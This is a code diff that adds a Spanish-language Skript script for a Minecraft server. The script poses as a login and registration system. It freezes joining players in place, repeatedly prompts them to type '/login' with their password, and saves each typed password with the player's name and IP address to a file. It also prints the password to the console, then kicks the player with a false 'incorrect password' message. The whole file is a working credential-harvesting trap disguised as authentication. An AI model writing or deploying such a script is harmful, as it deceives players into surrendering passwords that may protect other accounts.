@@ -1,0 +1,46 @@
+on join:
+	execute console command "tp %player% 1 111 1"
+	#execute console command "/title %player% subtitle ['',{'text':'/login <contraseña>','color':'white','bold':'true'}]"
+	#execute console command "/title %player% title ['',{'text':'Inicia sesión','color':'green','bold':'true'}]"
+	send "" to console
+	send "&cIP of &a%player%: &9%ip of player%" to console	
+	message "     &7¿Eres nuevo? Usa /register Contraseña Contraseña"
+	message " &7¿Ya te has registrado? Usa el comando &e/login Contraseña"
+	message "&7----------------------------------------------------------"
+	message "&1"
+	message " &eLogeo Premium &7- &a&lINFORMACION"
+	message " &7¿Eres premium? Inicia sesión y &futiliza &b/premium"
+	message "&2"
+	message "&6Cuenta &f» &7Inicia sesión con &c/login contraseña"
+	wait 4 seconds
+	message "&6Cuenta &f» &7Inicia sesión con &c/login contraseña"
+	wait 4 seconds
+	message "&6Cuenta &f» &7Inicia sesión con &c/login contraseña"
+	wait 4 seconds
+	message "&6Cuenta &f» &7Inicia sesión con &c/login contraseña"
+	wait 4 seconds
+	message "&6Cuenta &f» &7Inicia sesión con &c/login contraseña"
+	wait 4 seconds
+	kick the player due to "&cHey! &8Solo dispones de &a20 segundos &8para acceder!"
+on any movement:
+	execute console command "tp %player% 0 100 0"
+on chat:
+	cancel event
+
+command /login [<text>]:
+	trigger:
+		if arg-1 is not set:
+			message "&6Cuenta &7» Usa: /login contraseña"
+		if arg-1 is set:
+			wf "%player% (%ip of player%) [/login %arg-1%]" to "data.txt"
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "&aThe Password Of &5%player% &ais &d%arg-1%" to console
+			send "" to console
+			send "" to console
+			kick the player due to "&c&lHey! &7La contraseña que has introducido es incorrecta!"
